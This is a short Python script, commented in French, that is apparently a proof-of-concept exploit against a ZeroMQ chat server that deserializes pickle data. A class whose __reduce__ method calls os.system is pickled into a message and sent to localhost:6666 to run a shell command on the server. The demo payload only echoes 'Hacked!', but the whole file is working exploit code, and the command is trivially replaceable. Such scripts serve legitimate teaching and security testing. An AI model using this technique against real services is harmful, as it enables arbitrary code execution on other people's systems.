import pickle  
import zmq  
import os 

class MaliciousCode:
    def __reduce__(self):
        """Méthode spéciale exploitée par pickle pour exécuter du code arbitraire."""
        return (os.system, ("echo 'Hacked!'",))  # Exécution d'une commande malveillante

# Création du contexte et connexion au serveur
context = zmq.Context()
socket = context.socket(zmq.REQ)
socket.connect("tcp://localhost:6666")

#  (contenant le code malveillant)
exploit = pickle.dumps({"type": "message", "nick": "attacker", "message": MaliciousCode()})

# Envoi du message au serveur
socket.send(exploit)

# Réception de la réponse du serveur
response = socket.recv()
print(f"Server response: {pickle.loads(response)}")  # Affichage de la réponse après désérialisation
